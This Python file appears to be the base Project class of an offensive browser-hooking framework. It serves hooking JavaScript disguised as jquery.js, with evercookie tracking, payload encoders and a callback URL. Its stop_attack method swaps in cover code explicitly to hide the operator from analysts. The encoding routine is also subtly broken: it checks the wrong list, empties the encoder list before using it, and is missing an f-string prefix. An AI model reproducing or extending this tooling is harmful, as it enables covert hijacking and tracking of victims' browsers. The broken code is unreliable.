from abc import abstractmethod
import importlib
from queue import Queue
from steak.utils import steak_format
from .Client import Client
from .Validator import Validator
from .Module import Module
from .Logger import Logger
class Project:
    '''
    The Project is the base class for projects
    User should derive this class and implement their own project classes to tailor the attack procedure
    During the implementation, the function attack_client should be implemented
    And we also encourage our users the modify other attributes such as jsurl,fakejs_list,encoder_list and so on
    '''
    def __init__(self) -> None:
        self.logger = Logger(logger=f"Project {self.__class__.__name__}")
        self.clients={}
        self.jsurl='/jquery.js'
        self.jslist=['jquery.js','evercookie.js','swfobject-2.2.min.js','base64.js','main.js']
        self.encoder_list=['nothing']
        self.js_payload=''
        self.stopattack=False
        self.fakejs_list=['jquery.js']
        self.project_name='default project name'
        pass

    def readjs(self,jsname):
        '''
        read js from /steak/sources/
        '''
        self.logger.debug(f'reading contents from ./steak/sources/{jsname}')
        try:
            return open(f'./steak/sources/{jsname}').read()
        except FileNotFoundError:
            raise Exception(f'Javascript source file not found in /steak/sources/{jsname}, please check your filename')
    

    def encode_js(self,content:str)->str:
        '''
        Encodes the content with provided sequence of encoders in self.encoder_list
        '''
        if isinstance(self.jslist[0],str):
            try:
                self.encoder_list=[]
                for encodername in self.encoder_list:
                    self.logger.debug(f'loading encoder module from steak.encoders.{encodername}')
                    self.encoder_list.append(importlib.import_module('steak.encoders.{encodername}').encode)
            except ModuleNotFoundError:
                raise Exception(f'Can not find encoder module in file:steak/encoders/{encodername}.py, please check your name')
            except AttributeError:
                raise Exception(f'Can not find function encode in file of an attack module: steak/encoders/{encodername}.py, please check your code')
        for encodefunc in self.encoder_list:
            content=encodefunc(content)
        return content 

    def set_js_payload(self,content:str)->None:
        '''
        Encodes the content and set to js_payload cache
        '''
        self.js_payload=self.encode_js(content)    

    def generate_js(self,callbackpath:str,jsurl:str)->str:
        '''
        Check if js_payload cache exists.
        If not, it will generate js cache that is set by self.jslist and callback url
        Finally, it returns the js_payload cache
        '''
        self.logger.debug(f'generating js_payload with callbackpath:{callbackpath} and jsurl"{jsurl}')
        if not self.js_payload:
            self.set_js_payload(steak_format(';\n'.join([self.readjs(jsname) for jsname in self.jslist]),callbackpath=callbackpath,jsurl=jsurl))
        return self.js_payload

    def stop_attack(self,coverjs_list=['jquery.js'])->None:
        '''
        Stop running the project! 
        Stop ALL attacks on connected client immediately
        Replace the hooking javascript to cover js (which is a normal segments of  javascript, to hide us from analyst), by default, its jquery

        Args:
            coverjs_list: A list of javascript filenames. The function will read javascript file in steak/sources/ by filenames in coverjs_list  and return to client
        '''
        self.logger.debug(f'stop all attack of project whose name is {self.project_name}')
        Validator(coverjs_list,list)
        self.stopattack=True
        self.set_js_payload(';\n'.join([self.readjs(jsname) for jsname in coverjs_list]))
        for clientid in self.clients:
            self.clients[clientid].stop_attack()

    @abstractmethod
    def attack_client(self,client:Client)->None:
        '''
        User defined function.
        We expect that the user implements this function to define how to attack a newly connected client
        '''
        pass
    
    
    def load_module(self,modulename:str,*args,**kwargs)->Module:
        '''
        Generates a module object by its name and parameters passed in
        '''
        try:
            moduleobj=getattr(importlib.import_module(f'steak.modules.{modulename}.module'),modulename) 
        except ModuleNotFoundError:
            raise Exception(f'Can not find attack module in file:steak/modules/{modulename}/module.py, please check your name')
        except AttributeError:
            raise Exception(f'Can not find class {modulename} in file of an attack module: steak/modules/{modulename}/module.py, please check your code')

        return moduleobj(*args,**kwargs)
    